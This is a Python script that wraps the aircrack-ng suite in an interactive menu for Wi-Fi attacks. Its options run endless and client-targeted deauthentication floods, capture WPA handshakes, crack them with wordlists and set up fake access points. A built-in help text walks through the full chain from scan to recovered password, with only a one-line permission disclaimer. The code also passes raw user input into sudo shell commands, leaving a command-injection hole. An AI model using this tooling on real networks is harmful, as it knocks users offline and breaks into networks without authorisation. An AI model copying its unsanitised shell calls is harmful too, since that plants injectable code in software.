# Copyright (c) 2025 Nico
# This code is licensed under the MIT License – see LICENSE file for details.


from os import system
from time import sleep
from colorama import Fore

purple = "\033[38;5;129m"
restart = True 

def main_menu():
    input("Press key for menu: ")

def clear():
    system("clear")

def banner():
    system("clear")
    print(purple + """.................................................
.##...##..######..######..######..######..##..##.
.##...##....##....##........##......##.....####..
.##.#.##....##....####......##......##......##...
.#######....##....##........##......##......##...
..##.##...######..##......######....##......##...
.................................................""")
    print("")
        
def airmonng():
    print(Fore.MAGENTA + "Airmon-ng")
    print(purple + "[1] Start Monitor Mode")
    print("[2] Stop Monitor Mode")
    print("[3] Shows disturbing processes")
    print("[4] Kill disturbing processes")
    print("[5] Start Monitor on specific channel")
    print("")
def interfaces():
    print(Fore.MAGENTA + "interface")
    print(purple + "[6] Select interface")
    print("")
def airodumpng():
    print(Fore.MAGENTA + "airodump-ng")
    print(purple + "[7] Show all networks")
    print("[8] Targeted monitoring")
    print("")

def aireplayng():
    print(Fore.MAGENTA + "aireplay-ng")
    print(purple + "[9] Endless Deauth ")
    print("[10] Deauthentication attack (optional)")
    print("[11] Targeted against specific client")
    print("")

def airecrackng():
    print(Fore.MAGENTA + "airecrack-ng")
    print(purple + "[12] Crack WPA/WPA2 with Wordlist")
    print("")

def airbaseng():
    print(Fore.MAGENTA + "airbase-ng")
    print(purple + "[13] Set up a fake access point")
    print("")

def airgraphng():
    print(Fore.MAGENTA + "airgraph-ng")
    print(purple + "[14] Visualize network connections")
    print("")

def wash():
    print(Fore.MAGENTA + "wash")
    print(purple + "[15] Displays WPS capable networks") 
    print("")
def helper():
    print(purple + """This program is built entirely around the tools provided by airmon-ng, so please make sure to support its developers. Before you begin, it’s important to understand that most functions in this program can be stopped at any time by pressing Ctrl + C. To get started, you’ll first need to place your wireless interface into monitor mode. This is done using airmon-ng, which is shown at the beginning of the program. Simply follow the on-screen instructions to enable monitor mode on your interface. Once activated, your interface will typically be renamed to something like wlan0mon or wlan1mon.

Next, press 6 in the menu and select the interface you just switched into monitor mode. This interface will now be used to scan nearby wireless networks if you press 7. Please remember: only attempt to test or attack networks you own or have explicit permission to audit. During the scan, make note of the MAC address and the channel (usually a number between 1 and 13) of the target network. Once you have that information, proceed to step 8 in the program to start monitoring the network. Let the monitoring process run for a while so the necessary handshake data can be captured.

After that, return to the main menu and choose the "endless deauth" option. Follow the instructions provided by the program carefully. When enough data has been collected, you can check the .cap file (typically located in something like output/output.cap) to see if EAPOL packets have been successfully captured. If no EAPOLs are present, password cracking will not be possible. If they are, proceed to run aircrack-ng. Navigate to the .cap file and select it, then provide your own password list (for example: psw/password-list.txt). If the correct password is in the list, the brute-force process will succeed and reveal it.

Good luck—and if you have any further questions, feel free to reach out!""")

while restart == True:
        try:
            banner()
            airmonng()
            interfaces()
            airodumpng()
            aireplayng()
            airecrackng()
            airbaseng()
            airgraphng()
            wash()
            print(Fore.MAGENTA + "[16] Delete files in output")
            print(Fore.MAGENTA + "[17] help")
            print(Fore.MAGENTA + "[18] exit")
            mode = int(input(": "))
            if mode == 1:
                clear()
                system("sudo airmon-ng")
                interface_start = input("Enter interface for monitor mode: ")
                system(f"sudo airmon-ng start {interface_start}")
                sleep(1)
            elif mode == 2:
                clear()
                system("sudo airmon-ng")
                interface_stop = input("Enter interface to stop: ")
                system(f"sudo airmon-ng stop {interface_stop}")
                sleep(0)
            elif mode == 3:
                clear()
                system("sudo airmon-ng check")
                main_menu()
            elif mode == 4:
                clear()
                system("sudo airmon-ng check kill")
                sleep(3)
            elif mode == 5:
                clear()
                system("sudo airmon-ng")
                interface_start_channel = input("Enter interface: ")
                channel_airmon = input("Enter channel: ")
                system(f"sudo airmon-ng start {interface_start_channel} {channel_airmon}")
            elif mode == 6:
                clear()
                system("sudo airmon-ng")
                print("you can change that everytime!")
                interface = input("Enter the interface for airodump/aireplay/aircrack etc. (like wlan0mon): ")
            elif mode == 7:
                clear()
                system(f"sudo airodump-ng {interface}")
                main_menu()
            elif mode == 8:
                clear()
                print("After that you have the Code again for deauth!")
                monitoring_mac = input("Enter MAC: ")
                monitoring_channel = input("Enter channel: ")
                monitoring_output_name = input("Enter output file name: ")
                system(f"sudo airodump-ng -c{monitoring_channel} -w output/{monitoring_output_name} --bssid {monitoring_mac} {interface}")
            elif mode == 9:
                clear()
                endlessdeauth_mac = input("Enter MAC: ")
                system(f"sudo aireplay-ng --deauth 0 -a {endlessdeauth_mac} {interface}")
            elif mode == 10:
                clear()
                deauthattack_packages = input("Enter how many packages: ")
                deauthattack_mac = input("Enter MAC: ")
                system(f"sudo aireplay-ng --deauth {deauthattack_packages} -a {deauthattack_mac} {interface}")
            elif mode == 11:
                clear()
                deauthspecific_mac = input("Enter MAC: ")
                deauthspecific_client = input("Enter client MAC: ")
                system(f"sudo aireplay-ng --deauth 0 -a {deauthspecific_mac} -c {deauthspecific_client} {interface}")
            elif mode == 12:
                clear()
                system("ls output")
                aircrack_output = input("Enter the output Name: ")
                system("ls psw")
                aircrack_list = input("Enter the password list: ")
                clear()
                system(f"sudo aircrack-ng output/{aircrack_output} -w psw/{aircrack_list}")
                main_menu()
            elif mode == 13:
                clear()
                airbase_name = input("Enter Wifi name: ")
                airbase_channel = input("Enter channel 1-11: ")
                system(f'sudo airbase-ng -e "{airbase_name}" -c {airbase_channel} {interface}')
                main_menu()
            elif mode == 14:
                clear()
                system("ls output")
                airgraph_csv = input("Enter .csv file: ")
                airgrap_outputname = input("Enter output name: ")
                system(f"sudo airgraph-ng -i output/{airgraph_csv} -o output/{airgrap_outputname} -g CAPR")
                main_menu()
            elif mode == 15:
                clear()
                system(f"sudo wash -i {interface}")
                main_menu()
            elif mode == 16:
                system("rm -rf output")
                system("mkdir output")
            elif mode == 17:
                clear()
                helper()
                main_menu()
            elif mode == 18:
                clear()
                break
        except: KeyboardInterrupt